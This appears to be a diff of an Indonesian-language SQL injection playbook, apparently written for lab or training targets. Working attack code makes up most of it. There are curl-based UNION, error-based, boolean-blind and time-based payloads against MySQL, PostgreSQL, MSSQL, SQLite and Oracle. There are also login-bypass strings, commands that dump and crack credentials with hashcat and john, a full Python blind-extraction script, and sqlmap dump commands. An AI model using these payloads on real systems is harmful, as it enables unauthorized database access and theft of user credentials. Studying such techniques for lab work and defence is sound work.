-# Method 1: ORDER BY — tambah angka sampai error
-for i in 1 2 3 4 5 6 7 8 9 10; do
-    SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
-        --get --data-urlencode "$PARAM=10 ORDER BY $i-- -" "$TARGET_URL/item")
-    echo "ORDER BY $i → Size: $SIZE"
+```bash
+for i in 1 2 3 4 5 6 7 8; do
+  SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
+    --get --data-urlencode "$PARAM=10 ORDER BY $i-- -" "$TARGET_URL/item")
+  echo "ORDER BY $i → Size: $SIZE"
 done
 ```
 
-**OUTPUT BERHASIL ✅ — Error pada kolom tertentu:**
-
-text
+**OUTPUT ✅:**
 
 ```
-ORDER BY 1 → Size: 14820
-ORDER BY 2 → Size: 14820
 ORDER BY 3 → Size: 14820
-ORDER BY 4 → Size: 421    ← ERROR! Berarti ada 3 kolom
+ORDER BY 4 → Size: 421   ← ERROR → 3 kolom
 ```
 
-Bash
-
-```
+```bash
 export COL_COUNT=3
-echo "[+] Column count: $COL_COUNT"
 ```
 
-➡️ Lanjut ke **Langkah 2.2**
+### Langkah 2.2 — Find Displayable Column
 
-**OUTPUT BERHASIL ✅ — Semua ORDER BY tidak error:**
-
-Bash
-
-```
-# Coba NULL method sebagai alternatif
-curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL-- -" "$TARGET_URL/item" | wc -c
-curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL,NULL-- -" "$TARGET_URL/item" | wc -c
-curl -s --get --data-urlencode "$PARAM=10 UNION SELECT NULL,NULL,NULL-- -" "$TARGET_URL/item" | wc -c
+```bash
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
+  "$TARGET_URL/item"
 ```
 
-**OUTPUT NULL Method ✅:**
+Cari `INJECT_A`, `INJECT_B`, `INJECT_C` di response.
 
-text
-
-```
-421     ← 1 NULL → error
-421     ← 2 NULL → error  
-14820   ← 3 NULL → SUCCESS! 3 kolom
+```bash
+export DISPLAY_COL=1   # Kolom yang akan dipakai untuk output
 ```
 
-**OUTPUT GAGAL ❌ — ORDER BY langsung error bahkan di angka 1:**
+### Langkah 2.3 — Ekstrak DB Info
 
-text
+```bash
+# MySQL
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" \
+  "$TARGET_URL/item"
+
+# PostgreSQL
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT version(),current_database(),current_user-- -" \
+  "$TARGET_URL/item"
+```
+
+### Langkah 2.4–2.6 — Tables → Columns → Data
+
+```bash
+# Tables (MySQL)
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
+  "$TARGET_URL/item"
+
+# Columns
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -" \
+  "$TARGET_URL/item"
+
+# Dump credentials
+curl -s --get \
+  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password),'B','C' FROM users-- -" \
+  "$TARGET_URL/item"
+```
+
+**OUTPUT ✅ — Credential dump:**
 
 ```
-ORDER BY 1 → Size: 421
+admin:5f4dcc3b5aa765d61d8327deb882cf99,john:482c811da5d5b4bc6d497ffa98491e38
 ```
 
-➡️ Mungkin komentar `-- -` tidak bekerja. Coba:
+→ Simpan → crack hash → **FASE Post-SQLi**
 
-Bash
+---
+
+## ═══════════════════════════════════
+
+## FASE 3: LOGIN BYPASS
+
+## ═══════════════════════════════════
 
 ```
-# Coba komentar style lain
-curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1#" "$TARGET_URL/item" | wc -c
-curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1/*" "$TARGET_URL/item" | wc -c
+[Burp] Intercept POST /login → Repeater
 
-# Untuk Oracle: wajib ada FROM DUAL
-curl -s --get --data-urlencode "$PARAM=10 ORDER BY 1 FROM DUAL--" "$TARGET_URL/item" | wc -c
+username=administrator'--
+password=(bebas)
+```
+
+**OUTPUT ✅ — Redirect ke dashboard:**
+
+```
+HTTP/1.1 302 Found
+Location: /my-account
+```
+
+→ Logged in as administrator!
+
+**OUTPUT ❌ — Login still fail:**
+
+```bash
+# Coba variasi
+# administrator'--
+# admin'--
+# administrator'#
+# ' OR 1=1 LIMIT 1--
 ```
 
 ---
 
-### Langkah 2.2 — Temukan Kolom yang Displayable
+## ═══════════════════════════════════
 
-Bash
+## FASE 4: BOOLEAN BLIND EXTRACTION
 
-```
-# Ganti NULL dengan string 'A','B','C' sesuai jumlah kolom
-# Contoh untuk 3 kolom:
-curl -s --get \
-    --data-urlencode "$PARAM=10 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
-    "$TARGET_URL/item"
-```
+## ═══════════════════════════════════
 
-**OUTPUT BERHASIL ✅ — Terlihat string inject di response:**
+**Masuk sini jika:** TRUE/FALSE response berbeda
 
-HTML
+### Manual Character-by-Character
 
 ```
-<div class="product-name">INJECT_A</div>
-<div class="description">INJECT_B</div>
-<div class="price">INJECT_C</div>
+[Burp] Repeater:
+# Konfirmasi user ada
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a
+
+# Cek panjang password
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='a
+
+# Extract karakter pertama
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
 ```
 
-➡️ Semua 3 kolom displayable!
-
-Bash
+### Automasi via Burp Intruder
 
 ```
-export DISPLAY_COL=1    # Kolom yang akan dipakai untuk output data
+[Burp] Intruder → Cluster Bomb:
+Position 1: posisi karakter §1§ (1-20)
+Position 2: karakter §a§ (a-z, 0-9)
+
+Filter: Response contains "Welcome back!"
 ```
 
-**OUTPUT ✅ — Hanya beberapa kolom yang muncul:**
+### Automasi via Python Script
 
-HTML
-
-```
-<div class="product-name">INJECT_A</div>
-<!-- B dan C tidak muncul di page -->
-```
-
-➡️ Hanya kolom 1 yang displayable. Gunakan kolom 1 untuk inject data.
-
-**OUTPUT GAGAL ❌ — Tidak ada string yang muncul meski size bertambah:**
-
-Bash
-
-```
-# Coba dengan ID yang TIDAK ada agar row asli tidak menutupi inject
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
-    "$TARGET_URL/item"
-# Pakai id=0 atau id=99999 (yang tidak exist) supaya hanya row inject yang tampil
+```bash
+python3 boolean_blind.py \
+  --url "http://$TARGET/filter?category=Gifts" \
+  --cookie "TrackingId" \
+  --marker "Welcome back" \
+  --query "SELECT password FROM users WHERE username='administrator'"
 ```
 
 ---
 
-### Langkah 2.3 — Ekstrak Informasi Database
+## ═══════════════════════════════════
 
-Bash
+## FASE 5: TIME-BASED EXTRACTION
 
-```
-# STEP 1: Versi dan nama database (sesuaikan dengan DB type)
-# MySQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" \
-    "$TARGET_URL/item"
-
-# PostgreSQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT version(),current_database(),current_user-- -" \
-    "$TARGET_URL/item"
-
-# MSSQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT @@VERSION,DB_NAME(),SYSTEM_USER-- -" \
-    "$TARGET_URL/item"
-
-# SQLite:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT sqlite_version(),'n/a','n/a'-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅ — MySQL:**
-
-HTML
-
-```
-<div class="product-name">8.0.32-MySQL Community Server</div>
-<div class="description">shopdb</div>
-<div class="price">root@localhost</div>
-```
-
-Bash
-
-```
-export DB_VERSION="8.0.32"
-export DB_NAME="shopdb"
-export DB_USER="root@localhost"
-echo "[+] DB: $DB_NAME | Version: $DB_VERSION | User: $DB_USER"
-
-# PENTING: Jika user = root → bisa coba FILE privilege nanti!
-```
-
----
-
-### Langkah 2.4 — Ekstrak Nama Tabel
-
-Bash
-
-```
-# MySQL/MariaDB:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name SEPARATOR ', '),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
-    "$TARGET_URL/item"
-
-# PostgreSQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT string_agg(table_name,', '),'B','C' FROM information_schema.tables WHERE table_schema='public'-- -" \
-    "$TARGET_URL/item"
-
-# MSSQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT STRING_AGG(name,', '),'B','C' FROM sys.tables-- -" \
-    "$TARGET_URL/item"
-
-# SQLite - BERBEDA! Tidak ada information_schema
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT group_concat(name),'B','C' FROM sqlite_master WHERE type='table'-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-HTML
-
-```
-<div class="product-name">users, products, orders, sessions</div>
-```
-
-Bash
-
-```
-# Target jelas: tabel 'users'!
-export TARGET_TABLE="users"
-echo "[+] Tables found! Target: $TARGET_TABLE"
-```
-
-**OUTPUT GAGAL ❌ — GROUP_CONCAT terpotong (data terlalu panjang):**
-
-HTML
-
-```
-<div class="product-name">users,products,orders,sessions,logs,audit,config,api_ke</div>
-```
-
-➡️ Gunakan LIMIT untuk ambil per baris:
-
-Bash
-
-```
-# Ambil tabel satu per satu
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT table_name,'B','C' FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -" \
-    "$TARGET_URL/item"
-
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT table_name,'B','C' FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1-- -" \
-    "$TARGET_URL/item"
-```
-
----
-
-### Langkah 2.5 — Ekstrak Nama Kolom
-
-Bash
-
-```
-# MySQL - cari kolom di tabel users:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name SEPARATOR ', '),'B','C' FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -" \
-    "$TARGET_URL/item"
-
-# PostgreSQL:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT string_agg(column_name,', '),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" \
-    "$TARGET_URL/item"
-
-# SQLite - baca schema langsung:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT sql,'B','C' FROM sqlite_master WHERE type='table' AND name='users'-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-HTML
-
-```
-<div class="product-name">id, username, password, email, is_admin</div>
-```
-
-Bash
-
-```
-export TARGET_COLS="username,password"
-echo "[+] Columns found: id, username, password, email, is_admin"
-```
-
----
-
-### Langkah 2.6 — Ekstrak Data (THE GOAL!)
-
-Bash
-
-```
-# MySQL - dump semua username dan password:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),'B','C' FROM users-- -" \
-    "$TARGET_URL/item"
-
-# 0x3a = ':' (separator antara user:pass)
-# 0x0a = newline (separator antar baris)
-
-# Alternatif lebih readable:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,':',password),'B','C' FROM users-- -" \
-    "$TARGET_URL/item"
-
-# SQLite:
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT group_concat(username||':'||password),'B','C' FROM users-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅ — Credential dump:**
-
-HTML
-
-```
-<div class="product-name">admin:5f4dcc3b5aa765d61d8327deb882cf99,john:482c811da5d5b4bc6d497ffa98491e38</div>
-```
-
-Bash
-
-```
-# Simpan ke file
-echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > ~/sqli_loot/hashes/dump.txt
-echo "john:482c811da5d5b4bc6d497ffa98491e38" >> ~/sqli_loot/hashes/dump.txt
-
-cat ~/sqli_loot/hashes/dump.txt
-echo "[+] Credentials saved to ~/sqli_loot/hashes/dump.txt"
-
-# Identifikasi tipe hash
-hashid 5f4dcc3b5aa765d61d8327deb882cf99
-```
-
-**OUTPUT hashid ✅:**
-
-text
-
-```
-Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
-[+] MD2
-[+] MD5          ← Paling mungkin ini!
-[+] MD4
-```
-
-➡️ Crack hash! Ke **Langkah 2.7**
-
----
-
-### Langkah 2.7 — Crack Hash
-
-Bash
-
-```
-# Ekstrak hanya hash (tanpa username)
-cut -d: -f2 ~/sqli_loot/hashes/dump.txt > ~/sqli_loot/hashes/hashes_only.txt
-
-# MD5 (mode 0):
-hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt \
-    -o ~/sqli_loot/hashes/cracked.txt --force
-
-# MD5 dengan rules (jika gagal biasa):
-hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt \
-    -r /usr/share/hashcat/rules/best64.rule --force
-
-# Bcrypt (mode 3200) - lebih lambat:
-hashcat -m 3200 ~/sqli_loot/hashes/hashes_only.txt /usr/share/wordlists/rockyou.txt --force
-
-# Lihat hasil crack:
-cat ~/sqli_loot/hashes/cracked.txt
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-5f4dcc3b5aa765d61d8327deb882cf99:password
-482c811da5d5b4bc6d497ffa98491e38:john123
-```
-
-Bash
-
-```
-export ADMIN_USER="admin"
-export ADMIN_PASS="password"
-echo "[+] Cracked: $ADMIN_USER:$ADMIN_PASS"
-```
-
-**OUTPUT GAGAL ❌ — Hash tidak terpecahkan:**
-
-text
-
-```
-Session..........: hashcat
-Status...........: Exhausted
-```
-
-➡️ Coba strategi lain:
-
-Bash
-
-```
-# Online hash lookup (jika lab mengizinkan internet)
-# Search: https://hashes.com/en/decrypt/hash
-# Search: https://crackstation.net/
-
-# Atau coba wordlist lebih besar
-hashcat -m 0 ~/sqli_loot/hashes/hashes_only.txt \
-    /usr/share/seclists/Passwords/darkweb2017-top10000.txt --force
-
-# Atau coba john dengan rules agresif
-john --wordlist=/usr/share/wordlists/rockyou.txt \
-    --rules=KoreLogic ~/sqli_loot/hashes/hashes_only.txt
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 3: ERROR-BASED SQL INJECTION
-
-## ═══════════════════════════════════════
-
-> **Masuk sini jika:** Ada SQL error yang muncul di response, tapi UNION tidak bekerja
-
-### Langkah 3.1 — MySQL Error-Based (ExtractValue)
-
-Bash
-
-```
-# ExtractValue - paling reliable di MySQL
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-XPATH syntax error: '~shopdb~'
-```
-
-Bash
-
-```
-# Sekarang ekstrak tabel
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -" \
-    "$TARGET_URL/item"
-
-# Output:
-# XPATH syntax error: '~users,products,orders~'
-
-# Ekstrak kolom dari tabel users
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))-- -" \
-    "$TARGET_URL/item"
-
-# Dump credentials (pakai LIMIT karena ada batasan panjang ~32 char)
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 0),0x7e))-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT ✅:**
-
-text
-
-```
-XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb~'
-```
-
-⚠️ **Perhatikan:** Output terpotong setelah ~32 karakter! Gunakan SUBSTRING untuk hash panjang:
-
-Bash
+## ═══════════════════════════════════
 
-```
-# Ambil bagian kedua dari hash yang terpotong
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,30),0x7e))-- -" \
-    "$TARGET_URL/item"
-
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),31,60),0x7e))-- -" \
-    "$TARGET_URL/item"
-```
-
----
-
-### Langkah 3.2 — MSSQL Error-Based (CONVERT)
-
-Bash
-
-```
-# MSSQL: paksa konversi tipe untuk trigger error berisi data
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT DB_NAME()))-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT ✅:**
-
-text
-
-```
-Conversion failed when converting the nvarchar value 'webapp' to data type int.
-```
-
-Bash
-
-```
-# Ekstrak tabel MSSQL
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -" \
-    "$TARGET_URL/item"
-
-# Ambil tabel berikutnya (OFFSET equivalent di MSSQL)
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN ('users')))-- -" \
-    "$TARGET_URL/item"
-```
-
----
-
-### Langkah 3.3 — PostgreSQL Error-Based (CAST)
-
-Bash
-
-```
-# PostgreSQL: cast ke integer untuk trigger error
-curl -s --get \
-    --data-urlencode "$PARAM=10 AND 1=CAST((SELECT current_database()) AS integer)-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT ✅:**
-
-text
-
-```
-invalid input syntax for type integer: "appdb"
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 4: BOOLEAN BLIND SQL INJECTION
-
-## ═══════════════════════════════════════
-
-> **Masuk sini jika:** Tidak ada error/output terlihat, tapi TRUE vs FALSE response berbeda ukuran/isi
-
-### Langkah 4.1 — Konfirmasi Boolean Blind
-
-Bash
-
-```
-# Ambil baseline 3x untuk pastikan konsisten
-for i in 1 2 3; do
-    curl -s -o /dev/null -w "%{size_download}\n" "$INJECT_URL"
-done
-
-# TRUE test:
-curl -s -o /dev/null -w "%{size_download}" \
-    --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
-echo " ← TRUE (AND 1=1)"
-
-# FALSE test:
-curl -s -o /dev/null -w "%{size_download}" \
-    --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
-echo " ← FALSE (AND 1=2)"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-14820 ← TRUE (AND 1=1)
-421   ← FALSE (AND 1=2)
-```
-
-Bash
-
-```
-export TRUE_SIZE=14820
-export FALSE_SIZE=421
-echo "[+] Boolean Blind confirmed! TRUE=$TRUE_SIZE | FALSE=$FALSE_SIZE"
-```
-
----
-
-### Langkah 4.2 — Ekstrak Data via Boolean (Manual)
-
-Bash
-
-```
-# Fungsi helper: cek apakah kondisi TRUE
-check_true() {
-    SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
-        --get --data-urlencode "$PARAM=10 AND ($1)-- -" "$TARGET_URL/item")
-    [[ "$SIZE" == "$TRUE_SIZE" ]] && echo "TRUE" || echo "FALSE"
-}
-
-# Test: apakah panjang nama database > 5?
-check_true "LENGTH(database())>5"
-
-# Test: apakah karakter pertama database adalah 's'?
-check_true "SUBSTRING(database(),1,1)='s'"
-
-# Binary search untuk karakter pertama (lebih efisien)
-check_true "ASCII(SUBSTRING(database(),1,1))>100"   # > 100?
-check_true "ASCII(SUBSTRING(database(),1,1))>110"   # > 110?
-check_true "ASCII(SUBSTRING(database(),1,1))>115"   # > 115?
-```
-
-**Proses Binary Search:**
-
-text
-
-```
-ASCII(char) > 100?  → TRUE  (char > 100)
-ASCII(char) > 110?  → TRUE  (char > 110)
-ASCII(char) > 115?  → FALSE (char ≤ 115)
-ASCII(char) > 112?  → TRUE  (char > 112)
-ASCII(char) > 113?  → TRUE  (char > 113)
-ASCII(char) > 114?  → TRUE  (char > 114)
-ASCII(char) > 115?  → FALSE
-→ ASCII = 115 = 's'  ← karakter pertama adalah 's'
-```
-
----
-
-### Langkah 4.3 — Otomasi Boolean dengan Python Script
-
-Bash
-
-```
-cat > ~/sqli_loot/boolean_blind.py << 'PYTHON_EOF'
-#!/usr/bin/env python3
-"""
-Boolean Blind SQLi Extractor
-Usage: python3 boolean_blind.py --url http://TARGET/item --param id --true-size 14820
-"""
-import argparse
-import sys
-import time
-import requests
-
-def is_true(session, url, param, payload, true_size, timeout=10):
-    try:
-        r = session.get(url, params={param: payload}, timeout=timeout)
-        return len(r.content) == true_size
-    except requests.RequestException as e:
-        print(f"\n[!] Error: {e}", file=sys.stderr)
-        return False
-
-def extract_string(session, url, param, query, true_size, max_len=50):
-    result = []
-    print(f"[*] Extracting: {query}")
-    
-    # Cek panjang string dulu
-    length = 0
-    for i in range(1, max_len + 1):
-        if is_true(session, url, param, f"10 AND LENGTH(({query}))>={i}-- -", true_size):
-            length = i
-        else:
-            break
-    
-    if length == 0:
-        print("[-] Could not determine length")
-        return ""
-    
-    print(f"[*] Length: {length}")
-    
-    # Binary search per karakter
-    for pos in range(1, length + 1):
-        lo, hi = 32, 126
-        while lo <= hi:
-            mid = (lo + hi) // 2
-            payload = f"10 AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
-            if is_true(session, url, param, payload, true_size):
-                lo = mid + 1
-            else:
-                hi = mid - 1
-        
-        char = chr(lo)
-        result.append(char)
-        print(f"\r[+] Progress: {''.join(result)}", end="", flush=True)
-        time.sleep(0.05)
-    
-    print()
-    return "".join(result)
-
-def main():
-    parser = argparse.ArgumentParser(description="Boolean Blind SQLi Extractor")
-    parser.add_argument("--url", required=True, help="Target URL")
-    parser.add_argument("--param", required=True, help="Injectable parameter")
-    parser.add_argument("--true-size", type=int, required=True, help="Response size when TRUE")
-    parser.add_argument("--query", default="database()", help="SQL query to extract")
-    args = parser.parse_args()
-    
-    session = requests.Session()
-    session.headers["User-Agent"] = "Mozilla/5.0"
-    
-    result = extract_string(session, args.url, args.param, args.query, args.true_size)
-    print(f"[+] Result: {result}")
-
-if __name__ == "__main__":
-    main()
-PYTHON_EOF
+### Konfirmasi
 
-chmod +x ~/sqli_loot/boolean_blind.py
-
-# Contoh penggunaan:
-# Ekstrak nama database:
-python3 ~/sqli_loot/boolean_blind.py \
-    --url "http://$TARGET/item" \
-    --param id \
-    --true-size 14820 \
-    --query "database()"
-
-# Ekstrak tabel:
-python3 ~/sqli_loot/boolean_blind.py \
-    --url "http://$TARGET/item" \
-    --param id \
-    --true-size 14820 \
-    --query "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
-
-# Ekstrak password admin:
-python3 ~/sqli_loot/boolean_blind.py \
-    --url "http://$TARGET/item" \
-    --param id \
-    --true-size 14820 \
-    --query "SELECT password FROM users WHERE username='admin' LIMIT 1"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-[*] Extracting: database()
-[*] Length: 6
-[+] Progress: shopdb
-[+] Result: shopdb
-```
-
-**OUTPUT GAGAL ❌ — Semua cek return FALSE:**
-
-text
-
-```
-FALSE
-FALSE
-FALSE
-FALSE
-```
-
-➡️ Syntax salah atau true_size salah. Verifikasi ulang:
-
-Bash
-
-```
-# Debug: print size untuk berbagai payload
-curl -s -o /dev/null -w "%{size_download}" --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
-curl -s -o /dev/null -w "%{size_download}" --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
-# Sesuaikan true_size dengan hasil di atas
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 5: TIME-BASED BLIND SQL INJECTION
-
-## ═══════════════════════════════════════
-
-> **Masuk sini jika:** Tidak ada perbedaan response sama sekali, tapi bisa paksa delay
-
-### Langkah 5.1 — Konfirmasi Time-Based
-
-Bash
-
-```
-# Ambil baseline timing dulu
-echo "=== Baseline timing ==="
-for i in 1 2 3; do
-    time curl -s -o /dev/null "$INJECT_URL" 2>&1 | grep real
-done
-
-echo "=== Delay test - MySQL SLEEP(5) ==="
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"
-
-echo "=== Delay test - MySQL conditional ==="
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND IF(1=1,SLEEP(5),0)-- -" "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅ — Ada delay ~5 detik:**
-
-text
-
-```
-=== Baseline timing ===
-real    0m0.115s
-real    0m0.112s
-real    0m0.118s
-
-=== Delay test ===
-real    0m5.134s    ← DELAY TERKONFIRMASI!
-```
-
-Bash
-
-```
-# Test per database jika MySQL tidak bekerja
-# PostgreSQL:
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND 1=(SELECT 1 FROM pg_sleep(5))-- -" "$TARGET_URL/item"
-
-# MSSQL:
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10; WAITFOR DELAY '00:00:05'-- -" "$TARGET_URL/item"
-
-# Oracle:
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -" "$TARGET_URL/item"
-```
-
----
-
-### Langkah 5.2 — Ekstrak Data via Time-Based (Manual)
-
-Bash
-
-```
-# Cek apakah karakter pertama database > 'm' (ASCII 109)
-# MySQL: IF(condition, SLEEP(5), 0)
-time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT ✅ — Delay 5 detik = TRUE (karakter > 'm'):**
-
-text
-
-```
-real    0m5.123s    ← TRUE
-```
-
-**OUTPUT ✅ — Tidak ada delay = FALSE:**
-
-text
-
-```
-real    0m0.115s    ← FALSE
-```
-
----
-
-### Langkah 5.3 — Otomasi Time-Based dengan SQLMap
-
-Bash
-
 ```
-# SQLMap lebih baik untuk time-based karena handle timing otomatis
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    -p $PARAM \
-    --technique=T \    # T = Time-based only
-    --time-sec=5 \
-    --dbs \
-    --batch \
-    --output-dir=~/sqli_loot/sqlmap_output/
+[Burp] Repeater:
+MySQL:      category=Gifts' AND SLEEP(10)-- -
+PostgreSQL: category=Gifts' AND 1=(SELECT 1 FROM pg_sleep(10))--
 
-# Setelah dapat DB name, dump tabel
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    -p $PARAM \
-    --technique=T \
-    -D shopdb \
-    -T users \
-    -C username,password \
-    --dump \
-    --batch
+Perhatikan response time di pojok kanan bawah Repeater
+Baseline ~200ms → delay ~10000ms = confirmed
 ```
-
-**OUTPUT BERHASIL ✅:**
 
-text
+### Extract Data
 
 ```
-[INFO] retrieved: shopdb
-Database: shopdb
-Table: users
-[2 entries]
-+----------+----------------------------------+
-| username | password                         |
-+----------+----------------------------------+
-| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| john     | 482c811da5d5b4bc6d497ffa98491e38 |
-+----------+----------------------------------+
+[Burp] PostgreSQL conditional:
+TrackingId=xyz'%3BSELECT+CASE+WHEN+(SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
 ```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 6: SQLMAP — AUTOMATION WORKFLOW
-
-## ═══════════════════════════════════════
-
-> **Gunakan SQLMap SETELAH manual confirm ada SQLi. Jangan langsung pakai SQLMap.**
-
-### Langkah 6.1 — Basic SQLMap Detection & Enumeration
-
-Bash
-
-```
-# Step 1: Detection basic
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    -p $PARAM \
-    --batch \
-    --output-dir=~/sqli_loot/sqlmap_output/
-
-# Step 2: Dengan cookies (jika butuh login)
-# Pertama: login manual, capture cookie dari browser/Burp
-export COOKIE="PHPSESSID=abc123def456"
-sqlmap -u "$TARGET_URL/dashboard?id=1" \
-    --cookie="$COOKIE" \
-    --batch \
-    --dbs
 
-# Step 3: POST request
-sqlmap -u "$TARGET_URL/search" \
-    --data="query=test&category=all" \
-    -p query \
-    --batch \
-    --dbs
+### SQLMap untuk Time-Based
 
-# Step 4: Dari file request (PALING RELIABLE untuk kompleks)
-# Cara: Di Burp → klik kanan request → Save item → simpan sebagai request.txt
+```bash
 sqlmap -r ~/sqli_loot/requests/request.txt \
-    --batch \
-    --dbs \
-    --output-dir=~/sqli_loot/sqlmap_output/
+  --technique=T \
+  --time-sec=10 \
+  --dbms=PostgreSQL \
+  -D public -T users -C username,password \
+  --dump --batch
 ```
 
 ---
 
-### Langkah 6.2 — Full Enumeration Sequence
+## ═══════════════════════════════════
 
-Bash
